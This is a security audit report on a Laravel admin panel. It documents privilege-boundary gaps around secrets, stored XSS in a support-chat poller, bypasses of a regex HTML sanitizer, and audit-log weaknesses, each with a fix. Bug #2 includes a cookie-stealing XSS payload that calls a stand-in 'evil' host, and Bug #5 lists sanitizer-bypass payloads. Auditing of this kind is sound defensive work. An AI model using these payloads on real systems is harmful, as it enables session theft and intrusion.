# Admin Panel — Security & Correctness Audit

Domain: **Admin Panel (backoffice)** — `backend/app/Http/Controllers/Admin/*`,
admin middleware, `AuditLog` / `AdminNotification` / `Option` models, `admin/*` Blade views.
Routes: `backend/routes/web.php:39-168`.

Auditor method: for every state-changing action the **route middleware** (`web.php`) **and**
the in-controller guards were verified, plus what request fields actually reach the model
(mass-assignment), the rendering context of user/supplier/buyer-supplied data (XSS), and the
sanitization path. Source was **not** modified.

---

## Summary table

| # | Severity | Title | Type | File(s) | Confidence |
|---|----------|-------|------|---------|------------|
| 1 | **Critical** | Settings (SMTP/Telegram/Pixel) are NOT main-admin gated — any regular admin can read & overwrite secrets and set the Telegram webhook | Privilege boundary / secret exposure / SSRF-ish | `SettingController.php`, `web.php:76-78` | High |
| 2 | **High** | Stored XSS into admin browser via support-chat polling (`innerHTML` of user/guest message text, file name, file URL) | Stored XSS → admin session takeover | `admin/support-chats/show.blade.php` (JS), `Api/SupportChatController.php` | High |
| 3 | **Medium** | Site-content / header & footer menu config not main-admin gated (any admin rewrites public site copy & menus) | Privilege boundary | `SiteContentController.php`, `web.php:67-68` | High |
| 4 | **Medium** | Audit log records denied main-admin actions as "successful" and stores full request payload (sensitive values; weak model/id parsing) | Audit integrity / sensitive-data logging | `AuditAdminActions.php` | High |
| 5 | **Medium** | XSS sanitizer is regex-based and bypassable (unquoted `on*=` handlers, entity-encoded `javascript:`); inconsistent (`<a>`/`<img>` allowed) | Stored XSS (defense-in-depth gap) | `PageController.php`, `ArticleController.php`, `EmailTemplateController.php`, `NotificationTemplateController.php` | Medium |
| 6 | **Low/Medium** | Category `text` (CKEditor) is NOT sanitized at all (unlike Pages/Articles) and is echoed into a `{!! !!}` textarea | Stored XSS (admin-authored) | `CategoryService.php`, `admin/*-categories/{create,edit}.blade.php` | Medium |
| 7 | **Low/Medium** | Mass-notification title/message not sanitized before broadcast to every user | Stored XSS (admin-authored, all users) | `NotificationController.php` | Medium |
| 8 | **Low** | SVG/ICO upload allowed for content blocks (stored, public URL) | Stored XSS if opened directly | `ContentController.php` | Medium |
| 9 | **Low** | `SupportChatController::assign` accepts any `users.id` (not constrained to admins); any admin can reassign any chat | Logic / weak validation | `Admin/SupportChatController.php:337` | High |
| 10 | **Low** | `IsMainAdmin` and several JSON endpoints answer denial with a 302→login instead of 403 (breaks AJAX, leaks auth state) | UX / API correctness | `IsMainAdmin.php` | High |
| 11 | **Info** | `supplier_balance` is editable from the generic user-edit form despite the comment claiming it was removed | Hardening note | `UserController.php:68`, `UserService.php:45-54` | High |

---

## BUG #1 — Settings tab (SMTP password, Telegram bot token, webhook, Pixel) is reachable & writable by **any** admin, not just the main admin  — **CRITICAL**

**Files:** `backend/app/Http/Controllers/Admin/SettingController.php`,
routes `backend/routes/web.php:76-78`.

**Guard verification:**
- Route middleware on `settings`, `settings/test-smtp`, `settings/notification-check` is only
  `['admin.auth', 'audit.admin']` (the outer group). They are **not** inside either
  `admin.main` sub-group (`web.php:104-108`, `123-126`).
- `SettingController` has **no constructor middleware** and **no inline `is_main_admin` check**
  (confirmed: `grep is_main_admin/middleware/__construct` returns nothing).

**Impact — read (secret exposure):** `index()` (`:18-32`) calls
`Option::get('smtp_password')` and `Option::get('telegram_bot_token')`, which the `Option`
model **decrypts** (`Option.php:55-62`), and passes the plaintext into the
`admin.settings.index` view. Any regular (non-main) admin can therefore read the SMTP password
and Telegram bot token in clear text — defeating the at-rest encryption.

**Impact — write:** `store()` (`:35`) lets a regular admin overwrite `smtp_*`, `telegram_*`,
`facebook_pixel_id`, dispute-auto-close, cookie, and support-chat options. Notably:
- Overwriting SMTP host/from/credentials → outbound mail (password resets, purchase receipts)
  is silently routed through an attacker-controlled relay (phishing / interception).
- `telegram` form (`:94-135`) takes a `telegram_bot_token`, calls
  `https://api.telegram.org/bot{token}/getMe`, and on success calls
  `TelegramBotService::setWebhook(config('app.url').'/api/telegram/webhook')` — a regular admin
  can re-point the support-Telegram integration to a bot they control.
- `testSmtp()` (`:151`) connects to an **arbitrary** `host`/`port` supplied in the request
  (only `port` 1-65535, `host` is any string) and emits a connection from the server — a
  blind SSRF / internal-port-prober primitive available to every admin.

**Why it matters:** The whole point of `Option`'s encrypted-fields list and the `admin.main`
role is to keep payment/SMTP/Telegram secrets away from junior staff admins. This route group
silently bypasses that boundary.

**Fix:** wrap the `settings*` routes in the `admin.main` group (like Admins management at
`web.php:123-126`), and/or add an inline `is_main_admin` check in `SettingController` actions;
do not pass decrypted secrets to the view for non-main admins. Allow-list `testSmtp` hosts.

---

## BUG #2 — Stored XSS into the admin's browser through the support-chat live poller — **HIGH**

**Files:** `backend/resources/views/admin/support-chats/show.blade.php` (client JS),
data from `backend/app/Http/Controllers/Admin/SupportChatController.php::getMessages` (`:464`),
source of the data `backend/app/Http/Controllers/Api/SupportChatController.php` (`:280-296`).

**Chain:**
1. A buyer or **guest** sends a support message. The user-side endpoint stores it verbatim:
   `Api/SupportChatController.php:284` → `'message' => trim($request->input('message',''))`
   (validated only `nullable|string|max:5000` — **no `strip_tags`/escaping**). Attachment
   `file_name` is `getClientOriginalName()` (`:296`) — also attacker-controlled, may contain
   markup.
2. The admin opens the chat. The JS poller (`getMessages`) fetches JSON and renders each new
   message with **`innerHTML` and unescaped template-literal interpolation**:
   - `show.blade.php:495-510`: `messageDiv.innerHTML = \`... <div class="message-text">${message.message}</div> ...\`;`
   - attachment block `:475-485` / `:873-887`: `${attachment.file_url}`, `${attachment.file_name}` injected raw into `href`/`src`/text.
   - second poller copy `:908-911`: `messageTextHtml = \`<div class="message-text">${message.message}</div>\`;` → `messageDiv.innerHTML = ...`.
3. Payload such as `<img src=x onerror=fetch('//evil/?c='+document.cookie)>` (or a file named
   `"><img src=x onerror=...>`) executes in the **authenticated admin session** when the chat is
   viewed → cookie/session theft, CSRF-token exfiltration, or driving any admin action.

Note: the **server-rendered** message list uses `{{ }}` (escaped, safe). The vulnerability is
exclusively in the JS that renders messages arriving after page load (and the search/append
paths), which bypass Blade escaping.

**Confidence:** High — both the unsanitized store and the `innerHTML` sinks were read directly.

**Fix:** build message DOM with `textContent` / `createTextNode`, or HTML-escape
`message.message`, `attachment.file_name`, `attachment.file_url` before interpolation; sanitize
inbound message text server-side as a defense-in-depth layer.

---

## BUG #3 — Site-content & menu editor is not main-admin gated — **MEDIUM**

**Files:** `backend/app/Http/Controllers/Admin/SiteContentController.php`, `web.php:67-68`.

`site-content` GET/POST sit in the plain admin group with no `admin.main` and no inline role
check. Any regular admin can rewrite the homepage hero/about/promote blocks, the entire
become-supplier landing, the currency, and the `header_menu`/`footer_menu` JSON
(`store()` `:18-37`). The menu values are persisted as JSON blobs into `Option` and rendered on
every public page; combined with the regex-only sanitization elsewhere this is a content-control
and potential public-XSS surface in the hands of junior staff. Same root cause as #1 (missing
`admin.main`).

**Fix:** gate behind `admin.main` (or inline check) consistent with the secrets boundary.

---

## BUG #4 — Audit-log middleware logs denied actions as success & records full request payloads — **MEDIUM**

**File:** `backend/app/Http/Middleware/AuditAdminActions.php`.

1. **False "success" entries.** `handle()` logs whenever the response
   `isSuccessful() || isRedirection()` (`:34`). Every main-admin-only controller denies by
   **redirecting** (302) — e.g. `AdminController` returns
   `redirect()->route('admin.dashboard')->with('error', ...)`, `PromocodeController::destroy`
   returns `redirect()->back()`. These denials are recorded by the audit middleware as a
   completed `create`/`update`/`delete`, so the audit trail shows actions that never happened
   and hides the fact that a regular admin *attempted* a privileged action. (JSON 403s like
   `promocodes.bulk-destroy` are correctly skipped — only the redirect-style denials pollute.)
2. **Sensitive payload capture.** `extractChanges()` (`:130`) stores
   `$request->except(['_token','_method','password','password_confirmation','current_password'])`
   as the `changes.new` array. This means values like SMTP host/username, `telegram_bot_token`,
   manual-delivery `account_data[]` (the actual delivered credentials!), promocode codes, voucher
   `code`, and `admin_comment` text are written verbatim into `audit_logs.changes` — a plaintext
   copy of secrets/credentials in a table any admin can read via the Activity Logs screen. The
   password denylist is also brittle (e.g. a `smtp_password` field is NOT in the denylist, so it
   would be logged in clear via the settings POST).
3. **Weak model/id attribution.** `extractModelInfo()` regex `#admin/([^/]+)/(\d+)#` (`:86`)
   mis-attributes nested routes (e.g. `service-accounts/{id}/export`, `disputes/{id}/resolve-refund`
   capture the right id but a generic `update`/`create` action), and `admins` maps to model
   `User` so an admin-management change is indistinguishable from a user change.

**Fix:** only log when the action's controller actually performed the mutation (or check the
flashed `error` session key / use explicit logging); add `smtp_password` and other secret keys
to the redaction list, or redact by an allow-list; never persist `account_data`.

---

## BUG #5 — Regex-based HTML sanitizer is bypassable and inconsistent — **MEDIUM**

**Files:** `PageController::sanitizeHtml` (`:100`), `ArticleController` (same helper),
`EmailTemplateController::sanitizeTemplateData` (`:167`),
`NotificationTemplateController::sanitizeTemplateData` (`:104`).

The sanitizer is `strip_tags($html, $whitelist)` followed by regexes:
`preg_replace('/on\w+\s*=\s*".*?"/i', ...)` (and a single-quote variant) and
`preg_replace('/javascript\s*:/i', ...)`.

Bypasses:
- The `on*=` regex **requires quotes**. An **unquoted** handler — `<img src=x onerror=alert(1)>`
  — is not matched, and `strip_tags` keeps attributes, so it survives.
- `PageController`/`ArticleController` whitelist includes `<a>` and `<img>`; a
  `javascript:`-style payload obfuscated with HTML entities (`javasc&#x3a;...`) or whitespace/
  newlines inside the scheme can dodge the `javascript:` regex.
- `strip_tags` does not neutralize attribute-level vectors (`style="..."`, `srcset`, `data:` URIs).

This is admin-authored content so it's defense-in-depth rather than a direct privilege jump, but
the project clearly intends these as XSS guards. **Fix:** use a real HTML sanitizer
(HTMLPurifier / `mews/purifier`) with an attribute allow-list.

---

## BUG #6 — Category `text` (CKEditor) is never sanitized and is echoed raw into a textarea — **LOW/MEDIUM**

**Files:** `backend/app/Services/CategoryService.php` (`saveCategory` → `saveTranslation`, no
sanitization), sinks:
`admin/product-categories/{create,edit}.blade.php`,
`admin/product-subcategories/{create,edit}.blade.php`,
`admin/article-categories/{create,edit}.blade.php`,
`admin/categories/{create,edit}.blade.php` — all do
`<textarea ...>{!! old('text.'.$code, $categoryData[$code]['text'] ?? '') !!}</textarea>`.

Unlike `PageController`/`ArticleController`, the category controllers and `CategoryService` apply
**no** `sanitizeHtml` to the `text` field. A stored value containing `</textarea><script>…`
breaks out of the textarea and runs in the admin edit page; the same `text` is also rendered on
public category pages. Stored by an admin, so lower severity, but it is the only CKEditor field
with *zero* sanitization. **Fix:** run the category `text` through the same sanitizer as pages.

---

## BUG #7 — Mass notifications are broadcast to every user without sanitization — **LOW/MEDIUM**

**File:** `backend/app/Http/Controllers/Admin/NotificationController.php` (`store` `:37-66`).

`store()` saves `title.*` / `message.*` translations via `saveTranslation($validated)` with **no**
`sanitizeTemplateData` call (every sibling template controller sanitizes). It then fans the
template out to `User::all()` (`getTargetUsers` `:89` always returns all users). If the client
renders notification title/message as HTML, an admin-authored payload is stored XSS against the
entire user base. **Fix:** sanitize before `saveTranslation`, mirroring
`NotificationTemplateController`.

---

## BUG #8 — Content-block image upload accepts SVG and ICO — **LOW**

**File:** `backend/app/Http/Controllers/Admin/ContentController.php` (`:112`):
`fields_file.*.*.* => file|mimes:jpeg,png,jpg,gif,svg,webp,ico|max:10240`. SVG can carry inline
`<script>`; stored on the public disk and surfaced as a URL in content fields. If any template
ever embeds the value inline (or a victim opens the file URL directly) it executes. Image upload
elsewhere (`ServiceAccountController`, `BannerController`) correctly excludes SVG. **Fix:** drop
`svg`/`ico` or sanitize SVG on upload.

---

## BUG #9 — `assign` accepts any user id and any admin can reassign any chat — **LOW**

**File:** `backend/app/Http/Controllers/Admin/SupportChatController.php` (`assign` `:337`).

Validation is `admin_id => required|exists:users,id` — **not** constrained to `is_admin = true`,
so a chat can be assigned to a regular end-user id (after which the per-assignee access checks in
`show`/`sendMessage` behave oddly). There is also no check that the caller currently owns the
chat, so any admin can yank a chat assigned to another admin. **Fix:** validate the target is an
admin; restrict reassignment to the current assignee or main admin.

---

## BUG #10 — Privileged/JSON denials answer 302→login instead of 403 — **LOW**

**File:** `backend/app/Http/Middleware/IsMainAdmin.php` (`:24`).

`IsMainAdmin` always `redirect(route('admin.login'))` on failure. For the AJAX main-admin routes
(`manual-delivery/process` is a POST; future JSON consumers) a logged-in but non-main admin gets
a 302 to the login page rather than a clean 403, which both breaks XHR handling and is a subtle
auth-state oracle. The inline controller denials likewise redirect (see #4). **Fix:** return 403
for non-GET / JSON requests.

---

## BUG #11 — `supplier_balance` editable from the generic user form (contradicts the code comment) — **INFO/HARDENING**

**Files:** `UserController::update` (`:68` validates `supplier_balance`),
`UserService::updateUser` (`:45-54`).

The controller comment (`:73-74`) claims `supplier_balance` "was removed from the general update",
but it is still validated and `UserService` still applies it (atomically, via `increment` on the
diff). So a regular admin editing a supplier user can directly set their `supplier_balance` from
the user-edit form, outside the audited `update-balance` / withdrawal flows and **without** an
`AuditLog` entry (only `users.update-balance` writes the explicit `update_balance` log; a plain
`PUT users/{id}` is only captured by the generic middleware, which — per #4 — may misattribute or
omit it). No privilege escalation (the `forceFill` set is limited to a fixed field list and does
**not** include `is_admin`/`is_main_admin`/`balance`), but supplier balance is money and should
not be a silent side effect of profile editing. **Fix:** remove `supplier_balance` from the
user-update validation/path as the comment intends, or route it through an audited balance op.

---

## Ruled-out / verified-safe (checked, no bug)

- **Admin/Staff management (`AdminController`).** Defense-in-depth is correct: routes are in the
  `admin.main` group **and** every action re-checks `is_main_admin`. New admins are created with
  `is_admin=true` only (no `is_main_admin`); main-admin record is protected from edit/block/delete;
  self-delete blocked. No way to promote self/others to admin or main-admin (no `is_admin`/
  `is_main_admin` field is ever mass-assigned or force-filled anywhere in the domain).
- **Privilege escalation via user/profile update.** `UserService::updateUser` `forceFill`s only a
  fixed whitelist (`is_blocked,is_pending,is_supplier,personal_discount,…`) — `is_admin`,
  `is_main_admin`, `balance` are never in `$data` (validation rejects them) nor in the force-fill
  set. `ProfileController` edits only the caller's own email/password.
- **Manual balance adjustment (`UserController::updateBalance`).** Routed in plain admin group
  (intended: all admins), but wrapped in `DB::transaction` + `lockForUpdate`, validates
  `operation/amount(min 0)`, rejects overdraw/negative-set, and writes an explicit `AuditLog`.
  An admin granting balance to themselves would be fully audited. Sound.
- **SQL injection.** All admin search/filter inputs (`AuditLogController`, `PurchaseController`,
  `ProductDisputeController`, `ManualDeliveryController`, `SupplierController`,
  `WithdrawalRequestController`) use Eloquent query-builder with bound parameters
  (`where(... 'like', "%{$x}%")` binds `$x`). `applySortOrder`/`ManualDelivery` sort columns are
  allow-listed (`in:id,price,created_at`, etc.). No raw concatenation into SQL found.
- **Product-image / banner / CKEditor uploads.** `mimes:jpeg,png,jpg,gif,webp` (no SVG/PHP),
  `Storage::store(...,'public')` generates random hashed names → no path traversal, no executable
  upload (except the SVG/ICO case in #8).
- **CSRF.** All state-changing admin POST/PUT/PATCH/DELETE go through Blade forms with the default
  `web` middleware `VerifyCsrfToken`; no admin route is excluded. AJAX (`bulk-action`, sort,
  notes, support polling) carries the CSRF token. No CSRF gap found.
- **IDOR.** Route-model binding + targeted guards: `SupportChatController::{show,getMessages,
  sendMessage,updateStatus}` enforce assignee/main-admin access; `deleteNote` checks note↔chat
  ownership and creator/main-admin. `SupplierController::show` and `ManualDelivery/ProductModeration
  ::show` 404 on wrong type/state. No horizontal-access bug found.
- **Mass-assignment on settings.** `SettingController::store` / `SiteContentController::store`
  iterate only over the **validated** keys (constrained by `getRules($form)`); arbitrary
  `Option` keys cannot be injected. (The *authorization* of who may call it is Bug #1/#3.)
- **Promocode/voucher bulk + main-admin gates.** `PromocodeController::{destroy,bulkDestroy}`
  enforce `is_main_admin` inline (bulk returns JSON 403). Voucher creation is collision-safe in a
  transaction. OK.
- **Race conditions in money flows.** `WithdrawalRequestController::{approve,markAsPaid}`,
  `ProductModerationController::{approve,reject}`, `ServiceAccountController::export`,
  `ManualDeliveryController::process`, `ProductDisputeController::resolveReplacement` all use
  `DB::transaction` + `lockForUpdate` with post-lock status re-checks. Sound.
- **CSV / formula injection.** `ServiceAccountController::export` returns a `text/plain` `.txt`
  download (not CSV), so spreadsheet formula-injection does not apply. No admin CSV/XLSX export
  endpoint exists in this domain.
- **Admin notification XSS.** `AdminNotification` `formatted_title/message` strip `:placeholders`
  and the dropdown/index render with `{{ }}` (escaped). Safe.
- **Option secret encryption.** `Option` encrypts `smtp_password`, `telegram_bot_token`,
  `cryptomus_*`, `monobank_token` at rest with graceful legacy fallback. Correct (the issue is the
  *access boundary* in #1, not the crypto).
